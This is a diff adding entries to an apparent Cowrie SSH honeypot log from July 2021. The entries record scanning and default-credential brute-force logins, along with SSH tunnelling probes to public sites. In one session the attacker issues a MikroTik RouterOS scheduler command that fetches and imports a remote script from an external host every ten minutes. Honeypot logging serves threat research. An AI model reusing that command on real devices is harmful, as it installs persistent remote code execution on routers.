@@ -3969,3 +3969,130 @@
 2021-07-15T11:47:39.799395Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 5.182.39.88:50120 (192.168.9.240:22) [session: 8f83e4d80259]
 2021-07-15T11:47:39.805195Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
 2021-07-15T11:47:39.805895Z [HoneyPotSSHTransport,1905,5.182.39.88] Connection lost after 0 seconds
+2021-07-15T11:50:21.739473Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 118.68.115.155:53965 (192.168.9.240:22) [session: 0922b2efc98e]
+2021-07-15T11:50:21.745187Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2021-07-15T11:50:21.745831Z [HoneyPotSSHTransport,1906,118.68.115.155] Connection lost after 0 seconds
+2021-07-15T11:50:27.979255Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 118.68.115.155:54103 (192.168.9.240:22) [session: cd8b115512a7]
+2021-07-15T11:50:27.984500Z [HoneyPotSSHTransport,1907,118.68.115.155] Remote SSH version: SSH-2.0-Go
+2021-07-15T11:50:28.213853Z [HoneyPotSSHTransport,1907,118.68.115.155] SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
+2021-07-15T11:50:28.222751Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-rsa'
+2021-07-15T11:50:28.223362Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2021-07-15T11:50:28.223950Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2021-07-15T11:50:28.496156Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2021-07-15T11:50:28.497887Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2021-07-15T11:50:28.722848Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'none'
+2021-07-15T11:50:28.951380Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'
+2021-07-15T11:50:28.955995Z [HoneyPotSSHTransport,1907,118.68.115.155] first time for 118.68.115.155, need: 9
+2021-07-15T11:50:28.956792Z [HoneyPotSSHTransport,1907,118.68.115.155] login attempt: 1
+2021-07-15T11:50:28.973625Z [HoneyPotSSHTransport,1907,118.68.115.155] login attempt [b'admin'/b''] failed
+2021-07-15T11:50:29.979744Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' failed auth b'password'
+2021-07-15T11:50:29.980528Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2021-07-15T11:50:30.209093Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2021-07-15T11:50:30.209754Z [HoneyPotSSHTransport,1907,118.68.115.155] Connection lost after 2 seconds
+2021-07-15T11:50:36.440296Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 118.68.115.155:54299 (192.168.9.240:22) [session: 7c68143c6f1f]
+2021-07-15T11:50:36.445394Z [HoneyPotSSHTransport,1908,118.68.115.155] Remote SSH version: SSH-2.0-Go
+2021-07-15T11:50:36.672681Z [HoneyPotSSHTransport,1908,118.68.115.155] SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
+2021-07-15T11:50:36.681217Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-rsa'
+2021-07-15T11:50:36.681828Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2021-07-15T11:50:36.682418Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2021-07-15T11:50:36.953180Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2021-07-15T11:50:36.954962Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2021-07-15T11:50:37.188935Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'none'
+2021-07-15T11:50:37.412509Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'
+2021-07-15T11:50:37.416552Z [HoneyPotSSHTransport,1908,118.68.115.155] Found cached: b'admin':b'admin'
+2021-07-15T11:50:37.433537Z [HoneyPotSSHTransport,1908,118.68.115.155] login attempt [b'admin'/b'admin'] succeeded
+2021-07-15T11:50:37.438007Z [HoneyPotSSHTransport,1908,118.68.115.155] Initialized emulated server as architecture: linux-x64-lsb
+2021-07-15T11:50:37.440325Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' authenticated with b'password'
+2021-07-15T11:50:37.441479Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2021-07-15T11:50:37.665905Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2021-07-15T11:50:37.666997Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2021-07-15T11:50:38.015901Z [twisted.conch.ssh.session#info] Executing command "b'/system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://strtbiz.site/poll/69bf04f0-9dcf-49a5-bdd4-310ac1902424 mode=http dst-path=7wmp0b4s.rsc\\r\\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write'"
+2021-07-15T11:50:38.021369Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,1908,118.68.115.155] CMD: /system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://strtbiz.site/poll/69bf04f0-9dcf-49a5-bdd4-310ac1902424 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
+2021-07-15T11:50:38.026470Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,1908,118.68.115.155] Command not found: /system scheduler add name=U6 interval=10m on-event=/tool fetch url=http://strtbiz.site/poll/69bf04f0-9dcf-49a5-bdd4-310ac1902424 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
+2021-07-15T11:50:38.274410Z [twisted.conch.ssh.session#info] exitCode: 0
+2021-07-15T11:50:38.275343Z [cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'
+2021-07-15T11:50:38.277230Z [HoneyPotSSHTransport,1908,118.68.115.155] Closing TTY Log: var/lib/cowrie/tty/b2da02dc2ea3e95db2387b5e6c7398e0b080bae5c825abe07746e05f36561b78 after 0 seconds
+2021-07-15T11:50:38.282079Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0
+2021-07-15T11:50:38.513617Z [cowrie.ssh.session.HoneyPotSSHSession#info] remote close
+2021-07-15T11:50:38.515080Z [HoneyPotSSHTransport,1908,118.68.115.155] avatar admin logging out
+2021-07-15T11:50:38.515723Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2021-07-15T11:50:38.516254Z [HoneyPotSSHTransport,1908,118.68.115.155] Connection lost after 2 seconds
+2021-07-15T11:51:17.108003Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 195.3.147.47:23450 (192.168.9.240:22) [session: 4fdbc037856b]
+2021-07-15T11:51:17.116746Z [HoneyPotSSHTransport,1909,195.3.147.47] Remote SSH version: SSH-2.0-OpenSSH_6.0
+2021-07-15T11:51:17.174489Z [HoneyPotSSHTransport,1909,195.3.147.47] SSH client hassh fingerprint: a7a87fbe86774c2e40cc4a7ea2ab1b3c
+2021-07-15T11:51:17.182651Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group-exchange-sha256' key alg=b'ssh-rsa'
+2021-07-15T11:51:17.183255Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-512' b'none'
+2021-07-15T11:51:17.183841Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-512' b'none'
+2021-07-15T11:51:17.702610Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2021-07-15T11:51:17.754694Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2021-07-15T11:51:17.809217Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'none'
+2021-07-15T11:51:17.863291Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'
+2021-07-15T11:51:17.867306Z [HoneyPotSSHTransport,1909,195.3.147.47] Found cached: b'admin':b'admin'
+2021-07-15T11:51:17.884217Z [HoneyPotSSHTransport,1909,195.3.147.47] login attempt [b'admin'/b'admin'] succeeded
+2021-07-15T11:51:17.888688Z [HoneyPotSSHTransport,1909,195.3.147.47] Initialized emulated server as architecture: linux-x64-lsb
+2021-07-15T11:51:17.891011Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' authenticated with b'password'
+2021-07-15T11:51:17.892058Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2021-07-15T11:51:17.944824Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'direct-tcpip' request
+2021-07-15T11:51:17.945629Z [HoneyPotSSHTransport,1909,195.3.147.47] direct-tcp connection request to 172.217.22.174:80 from 127.0.0.1:12320
+2021-07-15T11:51:18.001858Z [HoneyPotSSHTransport,1909,195.3.147.47] discarded direct-tcp forward request 0 to 172.217.22.174:80 with data b'GET / HTTP/1.0\r\nHost: google.com\r\n\r\n'
+2021-07-15T11:51:18.006247Z [cowrie.ssh.forwarding.FakeForwardingChannel#error] failed to connect to 172.217.22.174:80: Connection refused
+2021-07-15T11:51:18.006844Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0
+2021-07-15T11:51:18.060902Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote eof
+2021-07-15T11:51:18.153155Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote close
+2021-07-15T11:51:18.154247Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'direct-tcpip' request
+2021-07-15T11:51:18.154943Z [HoneyPotSSHTransport,1909,195.3.147.47] direct-tcp connection request to 2a00:1450:400f:807::200e:80 from 127.0.0.1:17012
+2021-07-15T11:51:18.212064Z [HoneyPotSSHTransport,1909,195.3.147.47] discarded direct-tcp forward request 1 to 2a00:1450:400f:807::200e:80 with data b'GET / HTTP/1.0\r\nHost: google.com\r\n\r\n'
+2021-07-15T11:51:18.216482Z [cowrie.ssh.forwarding.FakeForwardingChannel#error] failed to connect to 2a00:1450:400f:807::200e:80: Connection refused
+2021-07-15T11:51:18.217101Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 1
+2021-07-15T11:51:18.270161Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote eof
+2021-07-15T11:51:18.364856Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote close
+2021-07-15T11:51:18.365936Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'direct-tcpip' request
+2021-07-15T11:51:18.366629Z [HoneyPotSSHTransport,1909,195.3.147.47] direct-tcp connection request to 74.6.143.26:80 from 127.0.0.1:19423
+2021-07-15T11:51:18.425878Z [HoneyPotSSHTransport,1909,195.3.147.47] discarded direct-tcp forward request 2 to 74.6.143.26:80 with data b'GET / HTTP/1.0\r\nHost: yahoo.com\r\n\r\n'
+2021-07-15T11:51:18.430280Z [cowrie.ssh.forwarding.FakeForwardingChannel#error] failed to connect to 74.6.143.26:80: Connection refused
+2021-07-15T11:51:18.430877Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 2
+2021-07-15T11:51:18.483792Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote eof
+2021-07-15T11:51:18.576141Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote close
+2021-07-15T11:51:18.577237Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'direct-tcpip' request
+2021-07-15T11:51:18.577934Z [HoneyPotSSHTransport,1909,195.3.147.47] direct-tcp connection request to 2001:4998:124:1507::f001:80 from 127.0.0.1:17730
+2021-07-15T11:51:18.634638Z [HoneyPotSSHTransport,1909,195.3.147.47] discarded direct-tcp forward request 3 to 2001:4998:124:1507::f001:80 with data b'GET / HTTP/1.0\r\nHost: yahoo.com\r\n\r\n'
+2021-07-15T11:51:18.639015Z [cowrie.ssh.forwarding.FakeForwardingChannel#error] failed to connect to 2001:4998:124:1507::f001:80: Connection refused
+2021-07-15T11:51:18.639611Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 3
+2021-07-15T11:51:18.693401Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote eof
+2021-07-15T11:51:18.788002Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote close
+2021-07-15T11:51:18.789124Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'direct-tcpip' request
+2021-07-15T11:51:18.789817Z [HoneyPotSSHTransport,1909,195.3.147.47] direct-tcp connection request to 74.6.231.20:80 from 127.0.0.1:21514
+2021-07-15T11:51:18.846962Z [HoneyPotSSHTransport,1909,195.3.147.47] discarded direct-tcp forward request 4 to 74.6.231.20:80 with data b'GET / HTTP/1.0\r\nHost: yandex.ru\r\n\r\n'
+2021-07-15T11:51:18.851382Z [cowrie.ssh.forwarding.FakeForwardingChannel#error] failed to connect to 74.6.231.20:80: Connection refused
+2021-07-15T11:51:18.852144Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 4
+2021-07-15T11:51:18.904591Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote eof
+2021-07-15T11:51:18.998708Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote close
+2021-07-15T11:51:18.999788Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'direct-tcpip' request
+2021-07-15T11:51:19.000581Z [HoneyPotSSHTransport,1909,195.3.147.47] direct-tcp connection request to 2001:4998:24:120d::1:1:80 from 127.0.0.1:31242
+2021-07-15T11:51:19.071422Z [HoneyPotSSHTransport,1909,195.3.147.47] discarded direct-tcp forward request 5 to 2001:4998:24:120d::1:1:80 with data b'GET / HTTP/1.0\r\nHost: yandex.ru\r\n\r\n'
+2021-07-15T11:51:19.075788Z [cowrie.ssh.forwarding.FakeForwardingChannel#error] failed to connect to 2001:4998:24:120d::1:1:80: Connection refused
+2021-07-15T11:51:19.076427Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 5
+2021-07-15T11:51:19.129422Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote eof
+2021-07-15T11:51:19.130762Z [HoneyPotSSHTransport,1909,195.3.147.47] avatar admin logging out
+2021-07-15T11:51:19.131388Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2021-07-15T11:51:19.131918Z [HoneyPotSSHTransport,1909,195.3.147.47] Connection lost after 2 seconds
+2021-07-15T11:59:46.437400Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 107.189.3.151:36896 (192.168.9.240:22) [session: ed591df683d8]
+2021-07-15T11:59:46.473130Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2021-07-15T11:59:46.473776Z [HoneyPotSSHTransport,1910,107.189.3.151] Connection lost after 0 seconds
+2021-07-15T12:19:01.806620Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 5.182.39.88:47216 (192.168.9.240:22) [session: 2d2552d1bc65]
+2021-07-15T12:19:01.812193Z [HoneyPotSSHTransport,1911,5.182.39.88] Remote SSH version: SSH-2.0-OpenSSH_7.4
+2021-07-15T12:19:01.899594Z [HoneyPotSSHTransport,1911,5.182.39.88] SSH client hassh fingerprint: eecf4e14dea2b648c33ba89ab1b585c7
+2021-07-15T12:19:01.910056Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ssh-rsa'
+2021-07-15T12:19:01.910667Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-512' b'zlib@openssh.com'
+2021-07-15T12:19:01.911257Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-512' b'zlib@openssh.com'
+2021-07-15T12:19:02.099528Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2021-07-15T12:19:02.174045Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2021-07-15T12:19:02.251800Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2021-07-15T12:19:02.328611Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2021-07-15T12:19:02.332646Z [HoneyPotSSHTransport,1911,5.182.39.88] login attempt: 147
+2021-07-15T12:19:02.333323Z [HoneyPotSSHTransport,1911,5.182.39.88] login return, expect: [b'root'/b'lovely']
+2021-07-15T12:19:02.350021Z [HoneyPotSSHTransport,1911,5.182.39.88] login attempt [b'root'/b'admin'] failed
+2021-07-15T12:19:03.355995Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2021-07-15T12:19:03.356788Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2021-07-15T12:19:03.437138Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2021-07-15T12:19:03.437793Z [HoneyPotSSHTransport,1911,5.182.39.88] Connection lost after 1 seconds
